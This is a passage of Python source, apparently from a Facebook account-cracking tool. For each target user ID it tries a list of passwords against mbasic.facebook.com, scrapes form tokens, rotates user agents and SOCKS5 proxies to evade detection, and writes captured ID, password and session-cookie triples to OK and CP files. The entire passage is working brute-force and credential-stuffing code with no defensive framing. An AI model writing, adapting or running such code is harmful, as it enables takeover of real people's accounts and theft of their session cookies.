	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s💥%s😈/%s ok:%s/cp:%s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1811422855536630%26cbt%3D1663509307006%26e2e%3D%257B%2522init%2522%253A1663509307006%257D%26ies%3D1%26sdk%3Dandroid-8.2.0%26sso%3Dchrome_custom_tab%26scope%3Duser_photos%252Cuser_birthday%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e7d0caa0-7b42-4ee4-881d-1827bf1e07f2%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522l1ilajakvikmnachuimu%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb1811422855536630%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De7d0caa0-7b42-4ee4-881d-1827bf1e07f2%26tp%3Dunspecified&cancel_url=fb1811422855536630%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e7d0caa0-7b42-4ee4-881d-1827bf1e07f2%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522l1ilajakvikmnachuimu%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/v8.0/dialog/oauth?cct_prefetching=0&client_id=1811422855536630&cbt=1663509725313&e2e=%7B%22init%22%3A1663509725313%7D&ies=1&sdk=android-8.2.0&sso=chrome_custom_tab&scope=user_photos%2Cuser_birthday%2Cpublic_profile%2Cemail&state=%7B%220_auth_logger_id%22%3A%22b7cd9967-034c-4ab1-b5e6-54038cf40810%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22cij3c4gncq5abf8728fe%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fb1811422855536630%3A%2F%2Fauthorize&auth_type=rerequest&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&ret=login&fbapp_pres=0&logger_id=b7cd9967-034c-4ab1-b5e6-54038cf40810&tp=unspecified#_=_","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1811422855536630%26cbt%3D1663509307006%26e2e%3D%257B%2522init%2522%253A1663509307006%257D%26ies%3D1%26sdk%3Dandroid-8.2.0%26sso%3Dchrome_custom_tab%26scope%3Duser_photos%252Cuser_birthday%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e7d0caa0-7b42-4ee4-881d-1827bf1e07f2%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522l1ilajakvikmnachuimu%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb1811422855536630%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De7d0caa0-7b42-4ee4-881d-1827bf1e07f2%26tp%3Dunspecified&cancel_url=fb1811422855536630%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e7d0caa0-7b42-4ee4-881d-1827bf1e07f2%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522l1ilajakvikmnachuimu%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=en_US',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x} * --> {x}{K}{idf}|{pw}')
				print(f'\r{x} * --> {x}{M}{ua}{M}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#os.popen('play-audio data/cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x} * --> {H}{idf}|{pw}')
				print(f'\r{x} * --> {x}{H}{kuki}{H}')
				print(f'\r{x} * --> {x}{B}{ua}{B}\n')
				#print(f"{M}{ua}{M}\n")
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				#os.popen('play-audio data/ok.mp3')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> GITHUB.COM/RENVVV <<<<<#
